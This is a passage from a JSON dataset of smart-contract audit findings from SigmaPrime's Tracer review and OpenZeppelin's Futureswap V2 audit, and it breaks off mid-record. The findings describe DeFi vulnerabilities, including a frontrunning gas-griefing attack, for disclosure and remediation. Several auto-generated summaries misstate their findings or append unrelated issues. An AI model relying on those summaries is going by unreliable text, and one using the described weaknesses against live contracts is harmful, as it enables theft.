    {
      "id": "19705",
      "title": "Flip Commitments Are Not Charged Their Respective Mint And Burn Fee",
      "impact": "HIGH",
      "content": "## Description\nUsers are charged a fee on their tokens whenever they commit to mint or burn short or long tokens. A new commit type was introduced to allow users to flip their short tokens to long tokens and vice-versa. While it might be intended that fees should not be charged when a user flips their commit type (as the tokens remain within the protocol), it is not consistent with the implementation shown in other areas of the PoolCommitter.sol contract. As a result, users can constantly rebalance their portfolio without incurring any additional cost.\n\n## Recommendations\nConsider charging the relevant mint/burn fee on a flip commit. This change will likely introduce additional complexity to the protocol, so it may also be useful to keep this the same to incentivize users in two ways:\n- Users can rebalance their positions at no additional cost.\n- Users are incentivized to keep their money within the protocol as exiting and re-entering incurs a cost.",
      "summary": "\nThe PoolCommitter.sol contract has an issue where users are charged a fee on their tokens whenever they commit to mint or burn short or long tokens. A new commit type was introduced to allow users to flip their short tokens to long tokens and vice-versa, however, fees should not be charged when a user flips their commit type as the tokens remain within the protocol. This means users can constantly rebalance their portfolio without incurring any additional cost. \n\nIt is recommended to consider charging the relevant mint/burn fee on a flip commit. This change will likely introduce additional complexity to the protocol, but it can also incentivize users in two ways. Firstly, users can rebalance their positions at no additional cost and secondly, they are incentivized to keep their money within the protocol as exiting and re-entering incurs a cost. Additionally, TPP-05 Pool Keepers Can Re-Enter poolUpkeep() if Tokens With Callbacks Are Used.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19704",
      "title": "Protocol Fees Can be Double Claimed",
      "impact": "HIGH",
      "content": "## Description\n\nOn each update interval, a keeper will perform an upkeep which executes a price change in the asset being tracked before transferring the associated fees to the primary and secondary accounts. The `feeTransfer()` function handles how fee amounts are paid; however, the logic has been altered with the addition of the `claimPrimaryFees()` and `claimSecondaryFees()` functions. \n\n`feeTransfer()` will transfer fees to the respective accounts and increment two storage variables, `secondaryFees` and `primaryFees`. As a result, if anyone subsequently calls `claimPrimaryFees()` or `claimSecondaryFees()`, fees will be paid out to these accounts again.\n\n## Recommendations\n\nConsider removing the use of `safeTransfer()` in `feeTransfer()` such that fees are only transferred when `claimPrimaryFees()` or `claimSecondaryFees()` is called.",
      "summary": "\nThis bug report is about the feeTransfer() function which is used to handle the payment of fees associated with an asset being tracked. The logic of the function has been changed with the addition of the claimPrimaryFees() and claimSecondaryFees() functions. This causes the fees to be paid out multiple times if either of these functions is called subsequently. It is recommended that the use of safeTransfer() be removed from the feeTransfer() function so that fees are only transferred when either of the two functions is called.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19703",
      "title": "Keeper Rewards Are Not Scaled Down to Settlement Token Decimals",
      "impact": "HIGH",
      "content": "## Description\n\nThe perpetual pools protocol utilises keepers to upkeep leveraged pools. An upkeep can be performed by anyone and is incentivized through small payments denominated in the pools settlement token.\n\nAs settlement tokens can contain any arbitrary number of decimals fewer than 18, the `KeeperRewards.sol` contract will scale the price of the token retrieved by querying the oracle. Using this scaled amount, `{gas cost + overhead + incremental incentive}` is converted to the settlement token amount, but this is not scaled back to the settlement tokens decimals. As a result, if a settlement token uses any number of decimals fewer than 18, the protocol will severely overpay keeper rewards at a net cost to the leveraged pool and its users.\n\n## Recommendations\n\nConsider modifying the `keeperReward()` function to return a scaled down `wadRewardValue` which uses the settlement tokens decimals instead.",
      "summary": "\nThe Perpetual Pools protocol uses keepers to maintain leveraged pools. These keepers are incentivized with payments in the pool's settlement token. The KeeperRewards.sol contract scales the price of the token retrieved by querying the oracle, and this amount is then used to calculate the keeper reward. However, if the settlement token has fewer than 18 decimals, the keeper reward is not scaled back to the settlement token's decimals, leading to the protocol overpaying keeper rewards and incurring a net cost to the leveraged pool and its users. \n\nRecommendations include modifying the keeperReward() function to return a scaled down wadRewardValue that uses the settlement token's decimals instead. Another issue that was found is that protocol fees can be double claimed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19702",
      "title": "Attempts to Long Mint From Aggregate Balance Will Pay Twice or Revert",
      "impact": "HIGH",
      "content": "## Description\n\nWhen a user wants to mint pool tokens, they have the option to pay using `userAggregateBalance.settlementToken`. This is a record of settlement tokens owed to the user as a result of previous position burns. Importantly, it is intended such that you can mint a new position using this owed balance rather than withdrawing them and then sending these settlement tokens back to the contract to mint.\n\nThe `commit()` function includes different pathways dictating the logic flow. These depend on how the user intends to pay for a new long mint and are broken due to a misplaced bracket on line [316]. As a result, when a user attempts to long mint using their aggregate balance as the source of funds, they also trigger a long mint funded via their accounts token balance. If the user still has the contract approved to transfer the settlement token, then the call will succeed, and this additional mint is then never recorded. This will lead to a loss of funds for the user as these funds cannot be withdrawn.\n\nIn the event that the user has no more tokens approved for the contract to transfer on their behalf, then all subsequent long mint calls intended to be funded via the `userAggregateBalance` will revert.\n\n## Recommendations\n\nModify the if statement brackets on line [316] to mitigate the issue, as shown below.\n\n```plaintext\n((commitType == CommitType.LongMint || commitType == CommitType.ShortMint) && !fromAggregateBalance)\n```",
      "summary": "\nA bug has been discovered in the commit() function of a user's ability to mint pool tokens. The bug is caused by a misplaced bracket on line 316, which causes the function to have two pathways dictating the logic flow. This can lead to a user's funds being lost if they attempt to mint a new position using their aggregate balance as the source of funds. If the user still has the contract approved to transfer the settlement token, the call will succeed and the additional mint will not be recorded, leading to a loss of funds for the user. If the user has no more tokens approved for the contract to transfer, then all subsequent long mint calls intended to be funded via the userAggregateBalance will revert. To fix this issue, the ifstatement brackets on line 316 should be modified.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "11146",
      "title": "[L05] Unreachable code in Wallet.maybeWrapToken",
      "impact": "LOW",
      "content": "The [second conditional expression](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/wallet/Wallet.sol#L111) in the `Wallet.maybeWrapToken` function will always be `false` unless the `_publicTokenAddress` is malicious and returns inconsistent values for its `decimals`. Consider removing this `if` statement to reduce the deployment size of the contract.\n\n\n**Update:** *Fixed in [PR #521](https://github.com/futureswap/fs-core/pull/521).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11145",
      "title": "[L04] Unchecked input in Registry.removeExchange",
      "impact": "LOW",
      "content": "The [`Registry.removeExchange` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L259) does not require that the input `_exchange` is already in the `exchangeMapping`. Consider adding such a `require` statement to the `removeExchange` function. This will prevent an event (which doesnt exist yet, but should as per the Lack of event emissions during important actions issue) from firing when the `removeExchange` function is called but no exchange has been removed.\n\n\n**Update:** *Fixed in [PR #520](https://github.com/futureswap/fs-core/pull/520).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11144",
      "title": "[L03] Unchecked input in Registry.addExchange",
      "impact": "LOW",
      "content": "The [`Registry.addExchange` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L253) does not require that the input `_exchange` has not already been added. This means it is possible that a given exchange can be pushed to the `exchanges` array several times. If this happens, then the [`removeExchange` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L259) will remove only one instance of the exchange from the `exchanges` array  resulting in a state where an exchange is present in the `exchanges` array but does not have wallet access and does not appear in the `exchangeMapping` mapping.\n\n\nConsider having the `addExchange` function require that the `_exchange` has not already been added.\n\n\n**Update:** *Fixed in [PR #520](https://github.com/futureswap/fs-core/pull/520).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11143",
      "title": "[L02] Unbounded Loops",
      "impact": "LOW",
      "content": "There are a few unbounded loops in the codebase, such as the for loops in the [doFireRegistryUpdateEvent](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L210) and [getIndexOf](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L282) functions. These loops can exceed the block gas limit if the exchanges array is sufficiently large. This could prevent the voting system from being able to update addresses in the registry, and could also prevent the removal of exchanges from the exchanges array. We believe the Futureswap team is aware of this issue. We recommend keeping this issue in mind when supporting a large number of exchanges.\n\n\n**Update:** *Unchanged. Comment from the Futureswap team: The Futureswap team does not intend to launch a large number of exchanges and would update contracts beforehand if this was ever necessary. No change done.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11142",
      "title": "[L01] The public snapshot function of FsToken and LiquidityToken may be abused to increase gas costs",
      "impact": "LOW",
      "content": "The `FsToken` and `LiquidityToken` contracts inherit from [the `ERC20Snapshot` contract](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/drafts/ERC20Snapshot.sol), which has a [public `snapshot` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/drafts/ERC20Snapshot.sol#L46) that anyone can call at any time. There are potential risks to having this `snapshot` function be public. The risk are outlined [in the comments](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/token/ERC20/ERC20Snapshot.sol#L81) of the OpenZeppelin Contracts v3.1.0 of `ERC20Snapshot.sol`, quoted below.\n\n\n\n```\n* [WARNING]\n* ====\n* While an open way of calling {_snapshot} is required for certain trust minimization mechanisms such as forking,\n* you must consider that it can potentially be used by attackers in two ways.\n*\n* First, it can be used to increase the cost of retrieval of values from snapshots, although it will grow\n* logarithmically thus rendering this attack ineffective in the long term. Second, it can be used to target\n* specific accounts and increase the cost of ERC20 transfers for them, in the ways specified in the Gas Costs\n* section above.\n\n```\n\nIf this is a concern, then consider upgrading to use `v3.1.0` of the `ERC20Snapshot` contract, which makes the `snapshot` function internal. Alternatively, consider modifying the `v2.5.1` contract to make the `snapshot` function internal.\n\n\n**Update:** *Fixed in [PR #532](https://github.com/futureswap/fs-core/pull/532), where the `snapshot` function is now access-controlled.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11141",
      "title": "[M08] Attackers may cause honest users to be penalized under some conditions",
      "impact": "MEDIUM",
      "content": "In the [`MessageProcessor` contract](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol), if the [`callAddLiquidity`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L661), [`callRemoveLiquidity`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L676), [`callOpenTrade`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L691), and/or [`callCloseTrade`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L711) function uses more than 64 times the amount of gas used by the [`takePenalty` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L790), then an attacker can cause honest users to be penalized when they shouldnt be.\n\n\nThe attack works as follows. The attacker can monitor the mempool for incoming transactions from honest users (to, say, the [`addLiquidity` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L122)), grab the parameters out of the transaction, frontrun the users transaction with the attackers own transaction that submits the same parameters, but carefully chooses the `gasLimit` for the attack transaction such that the call to [`callAddLiquidity`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L136) (within the `addLiquidity` function) would fail with an out-of-gas error during its [call to the `Exchange` contract](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L671). This would not cause the transaction to revert, but instead cause `success` to be `false`. Then, because only 63/64 of the remaining gas was forwarded during the call to the exchange, there would be enough gas left over to execute the [`if (!success)` block](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L138-L148), which penalizes the user.\n\n\nThis vulnerability is not present in the current code with the current opcode pricing. However, it could be an issue if Ethereum opcodes are repriced, or if future upgrades change the gas usage of these functions.\n\n\nConsider adding a `minGas` parameter to the `userMessage`, and reverting during the [`verifyCommonParams` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L538) if `gasleft() < minGas`. This way, the user/UI can set the minimum amount of gas a relayer can use to process their transaction.\n\n\n**Update:** *Fixed in PRs [#533](https://github.com/futureswap/fs-core/pull/533) and [#537](https://github.com/futureswap/fs-core/pull/537), where the user can now specify a minimum amount of gas that the relayer must provide when submitting the users message and signature.*",
      "summary": "\nThis bug report is about a vulnerability in the MessageProcessor contract, which is a part of the fs_core system. This vulnerability could be exploited by an attacker to cause honest users to be penalized when they shouldnt be. The attack works by the attacker monitoring the mempool for incoming transactions from honest users, grabbing the parameters out of the transaction, and frontrunning the users transaction with the attackers own transaction. The attacker carefully chooses the gasLimit for the attack transaction such that the call to the Exchange contract would fail with an out-of-gas error. This would not cause the transaction to revert, but instead cause success to be false, and the user would be penalized.\n\nTo fix this vulnerability, the developers have added a minGas parameter to the userMessage, and reverted during the verifyCommonParams function if gasleft() < minGas. This way, the user/UI can set the minimum amount of gas a relayer can use to process their transaction. This vulnerability has been fixed in PRs #533 and #537.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11140",
      "title": "[M07] Refunded tokens can become stuck in the Wallet contract",
      "impact": "MEDIUM",
      "content": "The [`Wallet.refund` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/wallet/Wallet.sol#L340) can be called by anyone. It transfers `_amount` of `_tokenAddress` tokens from `msg.sender` to the Wallet contract, and credits `_userAddress`. If `_tokenAddress` has `decimals != 18` then the tokens transferred to the contract via this function may become stuck in the Wallet contract and require an upgrade to remove them.\n\n\nConsider having the `refund` function wrap the input token if necessary. Otherwise, consider documenting that the `refund` function should not be called with any `_tokenAddress` that does not have `decimals == 18`.\n\n\n**Update:** *Fixed in [PR #515](https://github.com/futureswap/fs-core/pull/515), where the `refund` function now reverts if the token does not have 18 decimals.*",
      "summary": "\nThis bug report is about the [`Wallet.refund` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/wallet/Wallet.sol#L340). This function allows anyone to transfer tokens from the sender to the Wallet contract, and credit a different user. However, if the token used does not have 18 decimals, the tokens can become stuck in the Wallet contract and require an upgrade to remove them.\n\nThe report suggests that the `refund` function should be modified to wrap the input token if necessary, or at least document that the function should not be used with tokens that do not have 18 decimals. This issue was later fixed in [PR #515](https://github.com/futureswap/fs-core/pull/515), where the `refund` function now reverts if the token does not have 18 decimals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11139",
      "title": "[M06] Lack of event emissions during important actions",
      "impact": "MEDIUM",
      "content": "There are several actions that perhaps should be emitting events but arent, such as: adding/removing wallet access, adding/removing price oracles, adding/removing exchanges, calling the [`doFireRegistryUpdateEvent` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L203), setting the various addresses via the `owner`, approving/vetoing in the `Voting` contract, etc.\n\n\nEvent emission is particularly important when adding/removing oracles and adding/removing wallet access because oracles and wallet accessors are not tracked in iterable objects. Without events to search, users will have a difficult time learning which addresses are oracles and which addresses have wallet access.\n\n\nConsider reviewing all actions on the platform and adding event emissions when changes are made to important state variables.\n\n\n**Update:** *Fixed in [PR #528](https://github.com/futureswap/fs-core/pull/528/) where events are now emitted when mappings in the registry are updated. It may still be worthwhile to add more events during other important actions, but the this fix covers the most important changes (changes to important variables stored in non-iterable data types).*",
      "summary": "\nThis bug report is about the lack of event emissions when making changes to important state variables in the Futureswap platform. Specifically, when adding/removing wallet access, adding/removing price oracles, adding/removing exchanges, calling the `doFireRegistryUpdateEvent` function, setting the various addresses via the `owner`, approving/vetoing in the `Voting` contract, etc. Without events to search, users will have a difficult time learning which addresses are oracles and which addresses have wallet access.\n\nThe issue has been fixed in PR #528, where events are now emitted when mappings in the registry are updated. It may still be worthwhile to add more events during other important actions, but the this fix covers the most important changes (changes to important variables stored in non-iterable data types).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11138",
      "title": "[M05] The instantWithdraw functions userMessage may be generic enough to introduce replay issues between platforms",
      "impact": "MEDIUM",
      "content": "The users signature for a call to the `instantWithdraw` function [is over generic data](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L413) that does not include any Futureswap-specific data. In particular, the user signs a struct that contains only a public token `address`, a `uint256 amount`, and a `uint256 userInteractionNumber`.\n\n\nIt is not unlikely that a user may interact with another DeFi platform (e.g., a platform that mimics Futureswaps meta transactions pattern) that also asks them to sign messages of this type. If that happens, then anyone can replay the users signature  which was intended for another platform  to Futureswap, causing the users funds to be instant-withdrawn to their wallet.\n\n\nThis does not result in any theft of funds, because the funds are withdrawn to the users own external account. However, it could be a griefing vector.\n\n\nConsider requiring that the `userMessage` include something Futureswap-specific.\n\n\n**Update:** *Fixed in [PR #495](https://github.com/futureswap/fs-core/pull/495), where the users signature now covers the Futureswap-specific `Registry` contract address.*",
      "summary": "\nThis bug report is about Futureswap's `instantWithdraw` function. It states that the user's signature for the function does not include any Futureswap-specific data, which means that a signature intended for another platform can be replayed to Futureswap, causing the user's funds to be instant-withdrawn to their wallet. This does not result in theft of funds, as the funds are withdrawn to the user's own external account, but it could be a griefing vector. The report suggests that the userMessage should include something Futureswap-specific to prevent this. The bug was fixed in PR #495, where the user's signature now covers the Futureswap-specific `Registry` contract address.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11137",
      "title": "[M04] The updatePayoutDistribution function does not correctly update the sumOfExchangeWeights on all exchanges",
      "impact": "MEDIUM",
      "content": "The [`for loop`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/incentives/Incentives.sol#L152-L157) in the `Incentives.updatePayoutDistribution` function is intended to update the `sumOfExchangeWeights` value for every exchange. However, the code is incorrect, and results in only a single exchange updating the its `sumOfExchangeWeights` value to the same value `allExchangeAddresses.length` many times.\n\n\nThe result is that all but one exchange will have an incorrect `sumOfExchangeWeights` until the next time the [`advanceWeek()` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/incentives/Incentives.sol#L81) is called.\n\n\nConsider refactoring this loop to correctly update the `sumOfExchangeWeights` on all exchanges.\n\n\n**Update:** *Fixed in [PR #514](https://github.com/futureswap/fs-core/pull/514).*",
      "summary": "\nA bug was reported in the `Incentives.updatePayoutDistribution` function of the `fs_core` repository. The code in this function contained a `for loop` which was intended to update the `sumOfExchangeWeights` value for every exchange, but there was an error in the code which caused only a single exchange to update its `sumOfExchangeWeights` value to the same value `allExchangeAddresses.length` many times. As a result, all but one exchange had an incorrect `sumOfExchangeWeights` until the next time the `advanceWeek()` function was called. It was recommended to refactor the loop to correctly update the `sumOfExchangeWeights` on all exchanges. The bug was fixed in PR #514.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11136",
      "title": "[M03] Unchecked output of the ECDSA recover function",
      "impact": "MEDIUM",
      "content": "The [`ECDSA.recover` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/cryptography/ECDSA.sol#L28) (in version `2.5.1`) returns `address(0)` if the signature provided is invalid. This function is used twice in the Futureswap code: Once [to recover an `oracleAddress` from an `oracleSignature`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L845), and again [to recover the users address from their signature](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L535).\n\n\nIf the oracle signature was invalid, the `oracleAddress` is set to `address(0)`. Similarly, if the users signature is invalid, then [the `userMessage.signer`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L517) or [the `withDrawer`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L418) is set to `address(0)`.\n\n\nThis can result in unintended behavior. For example, it allows users to perform some interactions on behalf of the zero address, or (in the unlikely event that `address(0)` were ever added as an oracle) it could allow all invalid `oracleSignature`s to be accepted as valid.\n\n\nConsider reverting if the output of the `ECDSA.recover` is ever `address(0)`. Also, consider modifying the [`Registry.addOracle` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L241) so that `address(0)` can never be added as an oracle.\n\n\n**Update:** *Fixed in [PR #493](https://github.com/futureswap/fs-core/pull/493).*",
      "summary": "\nThis bug report is about the `ECDSA.recover` function in the OpenZeppelin Contracts version 2.5.1 which is used twice in the Futureswap code. This function returns the address of the user or oracle if the signature provided is valid, but it returns `address(0)` if the signature is invalid. This can cause unintended behavior, such as allowing users to perform some interactions on behalf of the zero address, or allowing all invalid `oracleSignature`s to be accepted as valid.\n\nThe bug has been fixed in Pull Request #493. The fix suggests reverting the output if it is ever `address(0)` and modifying the `Registry.addOracle` function so that `address(0)` can never be added as an oracle.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11135",
      "title": "[M02] Users can add collateral to closed trades",
      "impact": "MEDIUM",
      "content": "During our audit, the Futureswap team independently discovered that users were capable of adding collateral to closed trades. Consider calling the [`ensureTradeOpen` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/exchange/Trading.sol#L737) during the [`Trading.addCollateral` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/exchange/Trading.sol#L601) to prevent this.\n\n\n**Update:** *Fixed in [PR #503](https://github.com/futureswap/fs-core/pull/503/).*",
      "summary": "\nFutureswap is a platform for users to trade in digital assets. During an audit of the platform, it was found that users were able to add collateral to trades that had already been closed. This bug was fixed in a pull request (#503) on the Futureswap Github repository. To prevent this issue from happening in the future, a function called 'ensureTradeOpen' should be called during the 'Trading.addCollateral' function. This will ensure that no collateral can be added to a closed trade.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11134",
      "title": "[M01] Not using upgrade safe contracts in FsToken inheritance",
      "impact": "MEDIUM",
      "content": "The `FsToken` contract is intended to be an upgradeable contract, used behind a proxy (namely, the `FsTokenProxy` contract).  \n\nHowever, the contracts `ERC20Snapshot`, `ERC20Mintable` and `ERC20Burnable` in the inheritance chain of `FsToken` are *not* imported from the upgrade safe library [`@openzeppelin/contracts-ethereum-package`](https://github.com/OpenZeppelin/openzeppelin-contracts-ethereum-package) but instead from [`@openzeppelin/contracts`](https://github.com/OpenZeppelin/openzeppelin-contracts/).\n\n\nFrom the [README file](https://github.com/OpenZeppelin/openzeppelin-contracts-ethereum-package/tree/v2.5.0/#extending-contracts) of the upgrades safe library:\n\n\n\n> \n> **you must use this package** and not @openzeppelin/contracts if you are writing upgradeable contracts.\n> \n> \n> \n\n\nIn particular, using the upgrades safe library in this case will ensure the inheritance from `Initializable` and the other contracts is always linearized as expected by the compiler (see this [forum post](https://forum.openzeppelin.com/t/why-is-initializable-inheritance-required-everywhere/284) for more info about it).\n\n\n**Update:** *Fixed in [PR #534](https://github.com/futureswap/fs-core/pull/534/files), where the FsToken was moved to [another repo](https://github.com/futureswap/fs_token) and adjusted to use the upgrade safe version.*",
      "summary": "\nThis bug report is about the `FsToken` contract, which is an upgradeable contract used behind a `FsTokenProxy` contract. The issue is that the contracts `ERC20Snapshot`, `ERC20Mintable` and `ERC20Burnable` in the inheritance chain of `FsToken` are not imported from the upgrade safe library `@openzeppelin/contracts-ethereum-package` but instead from `@openzeppelin/contracts`. This could cause issues with the compiler linearizing the inheritance from `Initializable` as expected. The issue has been fixed by moving the FsToken to another repo and adjusting it to use the upgrade safe version.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11133",
      "title": "[H03] MessageProcessor interactions can be frontrun for profit",
      "impact": "HIGH",
